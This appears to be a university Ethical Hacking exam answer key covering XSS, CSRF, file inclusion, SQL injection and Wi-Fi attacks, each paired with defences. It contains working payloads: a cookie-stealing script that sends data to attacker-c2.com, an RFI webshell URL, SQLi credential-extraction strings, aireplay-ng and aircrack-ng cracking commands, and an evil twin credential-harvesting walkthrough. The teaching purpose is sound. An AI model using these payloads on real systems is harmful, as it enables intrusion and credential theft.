# Ethical Hacking (EH) — Unit IV Model Answers & Marking Scheme
**Course**: Ethical Hacking (MD***) | **VIT Pune**  
**Unit IV**: Web Application and Wireless Security

---

## Answer 4.1 [4 Marks]
### Marking Scheme:
* **Part (a) XSS Typology (Reflected vs Stored vs DOM)**: 2 Marks (Persistence, execution point, server visibility)
* **Part (b) CSRF Attack Flow & Dual Defenses**: 2 Marks (1 mark mechanism + 1 mark Token & SameSite)

### Model Answer:
#### Part (a) XSS Typology Comparison

| Parameter | Reflected XSS (Type I) | Stored XSS (Type II) | DOM-Based XSS (Type 0) |
| :--- | :--- | :--- | :--- |
| **Persistence** | **Non-Persistent**: Payload resides in URL query parameters; not stored. | **Persistent**: Payload is permanently saved in the server's database (e.g., comments, profiles). | **Non-Persistent / Client**: Exists solely within client-side DOM; not saved on server. |
| **Execution Point**| Executed immediately when a victim clicks a specially crafted malicious link. | Executed automatically by every browser that requests the stored database content. | Executed by the victim's client-side browser JavaScript during DOM manipulation. |
| **Server Visibility**| **Yes**: Payload is sent to server in the HTTP GET/POST request and reflected back. | **Yes**: Payload is sent to and stored by the backend web application server. | **NO**: Payload remains in URL fragment (`#payload`) and is **never transmitted to the server**. |

#### Part (b) CSRF Mechanics and Countermeasures
1. **Attack Mechanics**:
   * A victim authenticates with `bank.com`, storing a valid session cookie in their browser.
   * While the session remains active, the victim visits an attacker's website (`evil.com`).
   * `evil.com` executes a hidden, auto-submitting form that transmits a funds transfer request to `bank.com`:
     ```html
     <form action="http://bank.com/transfer" method="POST" id="f">
         <input type="hidden" name="toAccount" value="Attacker" />
         <input type="hidden" name="amount" value="5000" />
     </form>
     <script>document.getElementById('f').submit();</script>
     ```
   * The victim’s web browser **automatically attaches the valid `bank.com` session cookie** with the cross-origin request. `bank.com` processes the transfer as authentic.
2. **Defenses**:
   * **Anti-CSRF Synchronizer Tokens**: The server generates a cryptographically random, unpredictable token unique to the current user session and embeds it as a hidden field in forms. Because external sites (`evil.com`) cannot read the token under the Same-Origin Policy (SOP), their forged requests lack this token and are rejected by the server.
   * **`SameSite=Strict` Cookie Flag**: Instructs the browser to withhold the session cookie completely on any cross-site request, ensuring cross-origin POST requests arrive unauthenticated.

---

## Answer 4.2 [4 Marks]
### Marking Scheme:
* **Part (a) Directory Traversal & LFI vs RFI**: 2 Marks (1 mark definitions + 1 mark code examples)
* **Part (b) Security Headers (CSP, HSTS, X-Frame-Options)**: 2 Marks

### Model Answer:
#### Part (a) Directory Traversal and File Inclusion (LFI vs RFI)
1. **Directory Traversal (Path Traversal)**:
   * Exploits insufficient path sanitization to access arbitrary files outside the web root directory using dot-dot-slash sequences:
     `GET /download.php?file=../../../../etc/passwd HTTP/1.1`
2. **LFI vs RFI**:
   * **Local File Inclusion (LFI)**: Forces the server to include and execute a file residing locally on the server filesystem.
     * *Vulnerable Code*:
       ```php
       <?php include("templates/" . $_GET['page']); ?>
       ```
     * *Exploit*: `?page=../../../../var/log/apache2/access.log` (LFI chained with Apache access log poisoning containing PHP code).
   * **Remote File Inclusion (RFI)**: Exploits PHP file inclusion functions with `allow_url_include = On` to fetch and execute a remote script hosted on an external server:
     * *Exploit*: `?page=http://attacker.com/malicious_shell.txt`
     * The server downloads and executes the remote webshell in local server context.

#### Part (b) Security Response Headers
1. **Content-Security-Policy (CSP)**:
   * `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;`
   * Restricts approved origins from which scripts, styles, and media can be loaded. Mitigates Cross-Site Scripting (XSS) by blocking inline scripts and unauthorized external scripts.
2. **Strict-Transport-Security (HSTS)**:
   * `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`
   * Instructs the browser to strictly communicate with the website over encrypted HTTPS connections only, defeating SSL-Stripping and man-in-the-middle downgrade attacks.
3. **X-Frame-Options**:
   * `X-Frame-Options: DENY` (or `SAMEORIGIN`)
   * Prevents the webpage from being rendered inside an `<iframe>`, `<frame>`, or `<object>`, neutralizing **Clickjacking attacks**.

---

## Answer 4.3 [8 Marks]
### Marking Scheme:
* **Part (a.1) Tautology Authentication Bypass**: 1.5 Marks
* **Part (a.2) UNION-Based Extraction Walkthrough**: 2 Marks
* **Part (a.3) Boolean vs Time-Based Blind SQLi**: 1.5 Marks
* **Part (b) Parameterized Prepared Statements & Code**: 3 Marks (1.5 marks explanation + 1.5 marks code snippet)

### Model Answer:
#### Part (a) SQL Injection Mechanics

1. **Tautology Authentication Bypass**:
   * Vulnerable query:
     ```sql
     SELECT * FROM users WHERE username = '$user' AND password = '$password'
     ```
   * An attacker inputs `admin' --` into the username field:
     ```sql
     SELECT * FROM users WHERE username = 'admin' --' AND password = ''
     ```
   * The single quote `'` closes the username literal string. The SQL comment operator `--` instructs the database engine to treat all subsequent tokens (the password check) as a comment. The query evaluates to `TRUE` for user `admin`, logging the attacker in as Administrator without knowing the password.

2. **UNION-Based SQL Injection Walkthrough**:
   The `UNION` operator merges results from two SQL queries into a single output dataset:
   * *Step 1: Determine Column Count*: Inject `ORDER BY` clauses until an error is triggered:
     `' ORDER BY 1--`, `' ORDER BY 2--`, `' ORDER BY 3--` (Fails at 4 $\rightarrow$ table has 3 columns).
   * *Step 2: Determine Data Types*: Test which columns accept text data:
     `' UNION SELECT 'a', 'b', 'c'--`
   * *Step 3: Extract Sensitive Data*: Query the database schema or credential tables:
     `' UNION SELECT 1, username, password FROM users--`

3. **Boolean-Based vs Time-Based Blind SQLi**:
   * **Boolean-Based Blind SQLi**: Injects conditional expressions that evaluate to True or False. If the evaluated character is correct, the page renders normally; if false, content is omitted. Data is reconstructed character-by-character.
   * **Time-Based Blind SQLi**: Used when the application renders identical content regardless of True/False results. The attacker injects time delays (e.g., `'; IF (1=1) WAITFOR DELAY '0:0:5' --` or `SLEEP(5)`). If the server response takes 5 seconds to return, the injected boolean condition was True.

---

#### Part (b) Prepared Statements Defense & Code Demonstration

1. **Why Input Sanitization / Blacklisting Fails**:
   * Blacklisting dangerous characters (`'`, `--`, `UNION`, `SELECT`) is fundamentally flawed because attackers easily bypass filters using character encoding tricks, URL encoding (`%27`), hex encoding (`0x27`), or case manipulation (`uNiOn sElEcT`).
2. **How Prepared Statements Structurally Eliminate SQLi**:
   * Prepared statements enforce a strict architectural boundary between **code (the SQL command tree)** and **data (the user-supplied values)**.
   * The database engine compiles the SQL syntax structure with parameter placeholders (`?` or `:name`) **before** user input is ever bound.
   * When user-supplied strings like `admin' OR '1'='1` are passed, the database engine treats the entire input strictly as a literal scalar string value, rendering it syntactically impossible to alter the query logic.

```python
# SECURE IMPLEMENTATION IN PYTHON (psycopg2 / PostgreSQL / SQLite):
import sqlite3

def secure_login(username_input, password_input):
    conn = sqlite3.connect('enterprise.db')
    cursor = conn.cursor()
    
    # 1. SQL statement defined with parameter placeholders:
    query = "SELECT user_id, role FROM users WHERE username = ? AND password_hash = ?"
    
    # 2. Parameters passed separately as a tuple; treated strictly as data literals:
    cursor.execute(query, (username_input, password_input))
    user = cursor.fetchone()
    return user
```

---

## Answer 4.4 [8 Marks]
### Marking Scheme:
* **Part (a) 4 Generations of Wireless Security Table**: 4 Marks (1 mark per protocol: WEP, WPA, WPA2, WPA3)
* **Part (b) WPA2 4-Way Handshake & WPA3 SAE Resolution**: 4 Marks (1.5 marks handshake sequence + 1.5 marks deauth attack + 1 mark WPA3 SAE)

### Model Answer:
#### Part (a) 802.11 Wireless Security Protocols Comparison Matrix

| Protocol | Cipher & Type | Integrity Mechanism | Authentication Model | Known Vulnerabilities & Security Status |
| :--- | :--- | :--- | :--- | :--- |
| **WEP** (1997) | **RC4** (Stream cipher) | CRC-32 (Non-cryptographic checksum) | Shared Key / Open System | **Completely Broken**: 24-bit weak IV repeats rapidly; key cracked mathematically in seconds (FMS attack). |
| **WPA** (2003) | **RC4 + TKIP** (Temporal Key Integrity) | Michael MIC (64-bit cryptographic check)| Pre-Shared Key (PSK) or 802.1X | **Deprecated Interim Fix**: Vulnerable to Beck-Tews and Ohigashi-Morii packet injection attacks. |
| **WPA2** (2004) | **AES-CCMP** (Block cipher, 128-bit) | CBC-MAC | Pre-Shared Key (PSK) or 802.1X / RADIUS | **Vulnerable to Offline Cracking**: Capturing 4-way handshake allows offline dictionary attack; KRACK exploit. |
| **WPA3** (2018) | **AES-GCM** (128-bit) / 192-bit CNSA | BIP-GMAC / Protected Management Frames (PMF) | **SAE (Dragonfly Handshake)** or 802.1X EAP-TLS | **Modern Secure Standard**: Resists offline dictionary attacks; provides forward secrecy; PMF is mandatory. |

---

#### Part (b) WPA2 4-Way Handshake & WPA3 SAE Resolution

```
Client (Supplicant)                            Access Point (Authenticator)
      │                                                     │
      │ <─────────── 1. ANonce (AP Nonce) ─────────────────┤
      ├───────────── 2. SNonce + MIC (Derives PTK) ────────>│
      │ <─────────── 3. GTK + MIC (Installs Keys) ─────────┤
      ├───────────── 4. Confirmation ACK ──────────────────>│
```

1. **WPA2 4-Way Handshake Execution**:
   * Both Client and AP possess the Pre-Shared Key (PSK). The objective is to derive the Pairwise Transient Key (PTK):
     $$\text{PTK} = \text{PRF}(\text{PSK}, \text{ANonce}, \text{SNonce}, \text{MAC}_{\text{AP}}, \text{MAC}_{\text{Client}})$$
   * **Message 1**: AP transmits `ANonce` (random number) to Client.
   * **Message 2**: Client generates `SNonce`, computes PTK, and sends `SNonce` along with a Message Integrity Code (MIC) verifying possession of the PSK.
   * **Message 3**: AP derives PTK, verifies MIC, and transmits Group Temporal Key (GTK) encrypted under PTK.
   * **Message 4**: Client acknowledges key installation.

2. **The Deauthentication Attack & Offline Cracking**:
   * In 802.11a/b/g/n, management frames (including Deauthentication frames) are completely unencrypted and unauthenticated.
   * An attacker transmits spoofed deauthentication frames using `aireplay-ng -0 5 -a <AP_MAC> -c <Victim_MAC> wlan0mon`.
   * The victim station is violently kicked off the network.
   * When the victim automatically reconnects, the attacker’s sniffer (`airodump-ng`) captures the 4 EAPOL handshake messages.
   * The attacker takes the captured `.cap` file offline and runs dictionary attacks (e.g., `aircrack-ng -w rockyou.txt capture.cap`). Because the handshake is stored locally, the attacker can guess billions of passwords without touching the live network.

3. **How WPA3 Simultaneous Authentication of Equals (SAE) Resolves the Flaw**:
   * WPA3 replaces the vulnerable 4-way PSK handshake with **SAE (Dragonfly handshake)** based on zero-knowledge Diffie-Hellman:
     * **No Password on the Air**: The password is used to generate an ephemeral curve point rather than deriving session keys directly.
     * **Resistance to Offline Dictionary Attacks**: An attacker sniffing the air cannot test candidate passwords against captured packets; an attacker must interact with the live AP for each guess, allowing the AP to enforce rate-limiting.
     * **Mandatory Protected Management Frames (PMF - 802.11w)**: Management frames are cryptographically authenticated, preventing attackers from spoofing deauthentication frames.

---

## Answer 4.5 [10 Marks]
### Marking Scheme:
* **Part (a.1) OWASP Top 10 Breakdown (A01, A03, A07)**: 4 Marks (Root causes and enterprise mitigations)
* **Part (a.2) XSS Cookie Theft & Dual Defenses (HttpOnly & CSP)**: 2 Marks
* **Part (b.1) Evil Twin Attack Step-by-Step Walkthrough**: 2.5 Marks
* **Part (b.2) Enterprise Wireless Hardening Checklist**: 1.5 Marks

### Model Answer:
#### Part (a.1) OWASP Top 10 High-Yield Categories

1. **A01: Broken Access Control**:
   * *Root Cause*: Application fails to verify whether the authenticated user has permission to view or manipulate a specific object, leading to Insecure Direct Object References (IDOR), privilege escalation, and Server-Side Request Forgery (SSRF).
   * *Enterprise Mitigation*: Enforce server-side role-based access control (RBAC); deny by default; validate that the requesting user's session owns the target object ID before returning data.
2. **A03: Injection (SQLi, Command Injection)**:
   * *Root Cause*: Interpreters execute untrusted user data concatenated directly into commands or query strings without structural isolation.
   * *Enterprise Mitigation*: Mandatory use of Parameterized Prepared Statements; use of ORM frameworks; strict input validation using allowlists.
3. **A07: Identification and Authentication Failures**:
   * *Root Cause*: Allowing weak/compromised passwords, missing multi-factor authentication, lack of rate-limiting against credential stuffing, and session fixation.
   * *Enterprise Mitigation*: Enforce multi-factor authentication (MFA with FIDO2 hardware tokens); implement rate-limiting and account lockout; check passwords against known breached databases (e.g., Have I Been Pwned API).

---

#### Part (a.2) XSS Cookie Theft Chain & Defensive Mitigation

1. **Attack Chain**:
   * An attacker identifies an unencoded input reflection and injects a script:
     ```html
     <script>
         fetch('https://attacker-c2.com/steal?cookie=' + encodeURIComponent(document.cookie));
     </script>
     ```
   * The victim visits the page; the script executes within the victim’s browser, reads the session token from `document.cookie`, and exfiltrates it to the attacker's server. The attacker imports the cookie into their browser and hijacks the victim’s account without credentials.
2. **How `HttpOnly` and CSP Completely Neutralize the Attack**:
   * **`HttpOnly` Cookie Flag**: When set (`Set-Cookie: session_id=abc; HttpOnly; Secure; SameSite=Strict`), the browser strictly forbids client-side JavaScript APIs from accessing the cookie. Even if an attacker achieves full XSS script execution, `document.cookie` returns an empty string, completely preventing cookie theft!
   * **Content Security Policy (CSP)**: Deploying `Content-Security-Policy: default-src 'self'; script-src 'self';` prevents inline `<script>` tags from executing and instructs the browser to block outbound HTTP `fetch()` requests directed to unapproved external domains (`attacker-c2.com`).

---

#### Part (b.1) Evil Twin Access Point Attack Walkthrough

```
[ Genuine Corporate AP ] (SSID: CorpNet, Signal: -70 dBm)
           ▲
           │ 1. Attacker broadcasts deauthentication frames (aireplay-ng)
           │
[ Victim Laptop ] ──── Disconnected! ────► [ Evil Twin AP ] (SSID: CorpNet, Signal: -30 dBm)
                                           * Auto-connects to STRONGEST signal
                                           * Captive Portal harvests corporate credentials
```

1. **Step 1: Reconnaissance**: Attacker uses `airodump-ng` to monitor the environment, recording the corporate SSID (`CorpNet`), channel, and the MAC address of the legitimate AP.
2. **Step 2: Cloning the Access Point (Evil Twin)**: Attacker configures a rogue Wi-Fi adapter to broadcast the exact same SSID (`CorpNet`) and sets the transmission power higher (e.g., -30 dBm) so it appears as a much stronger signal to nearby laptops.
3. **Step 3: Forcing Disconnection**: Attacker injects forged deauthentication frames (`aireplay-ng -0`) spoofing the legitimate AP's MAC address, disconnecting corporate laptops.
4. **Step 4: Victim Reassociation**: Operating systems automatically seek out and reconnect to the Access Point offering the highest signal strength sharing the configured SSID. The laptop connects to the Evil Twin.
5. **Step 5: Credential Harvesting via Captive Portal**: The Evil Twin assigns an IP via DHCP, intercepts DNS requests, and displays a fake corporate splash screen prompting the user to "Enter Domain Password to Reconnect to Enterprise Wi-Fi". Stolen credentials are saved directly to the attacker’s machine.

---

#### Part (b.2) Enterprise Wireless Defense and Hardening Checklist

1. **Enterprise 802.1X Authentication**: Deploy **WPA3-Enterprise** or **WPA2-Enterprise** utilizing **EAP-TLS** authentication with client certificates. Eliminate Pre-Shared Keys (PSK) entirely so individual employees cannot share or leak network keys.
2. **Protected Management Frames (PMF / 802.11w)**: Mandate PMF across all wireless controllers to cryptographically sign deauthentication and disassociation frames, completely immunizing clients from deauthentication attacks.
3. **Wireless Intrusion Prevention System (WIPS)**: Deploy dedicated sensor radios running WIPS (e.g., Cisco CleanAir, Aruba AirWave) to continuously scan the RF spectrum, detect rogue APs and evil twins, and automatically contain them via automated switch port shutdown.
4. **Network Segmentation & Guest Wi-Fi**: Segregate wireless traffic into isolated VLANs. Route all Guest Wi-Fi through an isolated DMZ pipe with client isolation enabled, completely preventing guest devices from scanning or accessing internal corporate assets.
